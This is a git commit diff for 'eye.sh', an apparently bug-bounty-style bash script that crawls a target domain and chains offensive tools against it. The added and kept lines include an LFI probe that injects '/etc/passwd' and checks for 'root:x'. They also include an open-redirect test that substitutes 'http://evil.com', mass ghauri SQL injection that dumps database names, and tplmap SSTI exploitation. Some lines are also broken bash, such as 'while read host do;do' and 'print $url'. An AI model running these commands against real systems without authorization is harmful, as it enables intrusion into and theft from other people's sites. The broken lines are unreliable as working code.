677ca9813b1070e1c4979643878a6ab77f6c7a03
00xZ <eyezikbra@gmail.com>
2024-06-15 00:10:13 -0500

    Update eye.sh

--- eye.sh
+++ eye.sh
@@ -70,20 +70,26 @@ vuln1() {
     fi
     
     echo $2
-    echo -e "$CYAN${BOLD} [+] Parsing ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit
+    echo -e "$CYAN${BOLD} [+] Parsing With GF ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit
     cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
     cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
+    cat output/$domain/lfi.txt | qsreplace | anew output/$domain/lfi_qsr.txt 
     cat output/$domain/raw_urls.txt | gf sqli > output/$domain/sqli.txt
     cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
     cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
     cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
     cat output/$domain/raw_urls.txt | gf xss | sort | uniq > output/$domain/xss.txt
-    echo -e "$green [+]$magenta Life Check "
+    echo -e "$green [+]$magenta Compacting... "
     cat output/$domain/xss.txt | trashcompactor | anew output/$domain/reflected_alive.txt #FIX
     cat output/$domain/xss.txt | gxss -c 100 | anew output/$domain/gxss_dump.txt
     echo -e "$yellow [+]$green Finding Hidden Files "
     cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | anew output/$domain/hidden_files.txt
     cat output/$domain/subs.txt| httpx -silent | anew output/$domain/subs_alive.txt #dirsearch makes you use the full path dir /root/eye/output/... instead of output/....
+    echo -e "$yellow [+]$green${BOLD} [!] Crawling Domain [!] "
+    katana -u $domain | anew output/$domain/spider_top-domain.txt
+    echo -e "$yellow [+]$CYAN${BOLD} [!] Crawling Subdomains [!] "
+    katana -list output/$domain/subs_alive.txt | anew output/$domain/Spidered_subs.txt
+    cat output/$domain/Spidered_subs.txt | gf xss | anew output/$domain/xss.txt
     dirsearch -l ~/eye/output/$domain/subs_alive.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o ~/eye/output/$domain/hidden_dir.txt
 
 }
@@ -100,20 +106,27 @@ vuln2() {
 
     echo -e "$RED${BOLD} \n Vulnerability Scanning \n${NC}"
     cd tools/
-    nuclei ../output/$domain/params.txt -t ~/nuclei-templates -es info,unknown -etags ssl,tcp,code,javascript,whois | anew ../output/$domain/_nuclei.txt
+    nuclei ../output/$domain/params.txt -t file/logs -t exposures/files -t cves/ | anew ../output/$domain/_nuclei.txt
     cat ../output/$domain/params.txt | xargs -I @ sh -c './xray_linux_amd64 ws --url @ --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal,crlf-injection,dirscan --html-output ../output/$domain/xray/"xray_$(echo @ | tr / _).html"'
 }
 
 vuln3() {
 	echo -e "$RED${BOLD} --- $green${BOLD}Custom Exploit Scan $RED${BOLD}--- ${NC} \n"
-    echo -e "$CYAN${BOLD} \n [!] XSS Scan: \n${NC}"
-    cat output/$domain/gxss_dump.txt | dalfox pipe -o cat output/$domain/VULN_xss.txt
-    [ -s output/$domain/VULN_xss.txt ] && echo -e "$green${BOLD} [+] VULN XSS [+] Check output/$domain/VULN_xss.txt for output ${NC}" || echo  -e "$RED [+] No XSS Found[+] ${NC}"
-    echo -e "$CYAN${BOLD} \n [!] CSRF Scan: \n${NC}"
-    crlfuzz -l output/$domain/subs.txt -o output/$domain/VULN_csrf.txt
-    [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] VULN CSRF [+] Check output/$domain/VULN_csrf.txt for output ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
+    echo -e "$yellow${BOLD} \n [!] SSTI Scan: \n$CYAN"
+    for url in $(cat output/$domain/gxss_dump.txt); do python3.9 tools/tplmap/tplmap.py -u $url; anew output/$domain/VULN_ssti; done
+    [ -s output/$domain/VULN_ssti.txt ] && echo -e "$green${BOLD} [+] FOUND VULN SSTI [+] Check output/$domain/VULN_ssti.txt for output ${NC}" || echo -e "$RED [+] No SSTI Found[+] ${NC}"
+    echo -e "$CYAN${BOLD} \n [!] LFI Scan: \n$yellow" # check the LFIscanner dir for an output / should edit the LFIscanner.py and have it output the "VULN" to a file 
+    for url in $(cat output/$domain/lfi_qsr.txt); do python3 tools/LFIscanner/LFIscanner.py -t $url -p tools/LFIscanner/payloads.txt; print $url; anew output/$domain/VULN_lfi; done
 
-    cat output/$domain/lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI VULN! %"'
+    #for url in $(cat output/$domain/ssti.txt); do python3.9 tools/tplmap/tplmap.py -u $url; print $url; done #if error make sure to not use python 3.11 or above #another fix for tplmap: https://github.com/epinna/tplmap/issues/118
+    echo -e "$green${BOLD} \n [!] XSS Scan: \n${NC}"
+    #cat output/$domain/gxss_dump.txt | dalfox pipe | anew output/$domain/VULN_xss.txt
+    [ -s output/$domain/VULN_xss.txt ] && echo -e "$yellow${BOLD} [+] FOUND VULN XSS [+] Check output/$domain/VULN_xss.txt for output ${NC}" || echo  -e "$RED [+] No XSS Found[+] ${NC}"
+    echo -e "$CYAN${BOLD} \n [!] CSRF Scan: \n${NC}"
+    crlfuzz -l output/$domain/subs_alive.txt -o output/$domain/VULN_csrf.txt
+    [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] FOUND VULN CSRF [+] Check output/$domain/VULN_csrf.txt for output ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
+
+    cat output/$domain/lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI VULN! %"' | anew VULN_lfi.txt
     cat output/$domain/redirect.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host $green${BOLD} Open Redir. Vulnerable\n" ;done
     cat output/$domain/sqli.txt | parallel -j 50 'ghauri -u '{}' --dbs --hostname --confirm --batch' | anew output/$domain/VULN_sqli.txt
 }
